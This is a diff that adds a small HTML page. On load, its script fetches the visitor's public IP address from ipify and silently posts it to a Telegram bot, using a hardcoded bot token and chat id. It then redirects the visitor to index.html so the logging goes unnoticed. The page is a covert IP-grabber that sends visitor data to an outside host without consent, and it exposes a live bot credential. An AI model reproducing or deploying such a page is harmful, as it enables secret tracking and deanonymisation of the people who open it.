@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          fetch('https://api.telegram.org/bot8236491734:AAFiSthGt1Y2rxSUPlQb8NOSs42EbZyUo2Y/sendMessage', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: '-1002851843782',
+              text: `IP Address: ${ipAddress}`
+            })
+          })
+          .then(() => {
+            window.location.href = 'index.html';
+          });
+        });
+    </script>
+  </body>
+</html>
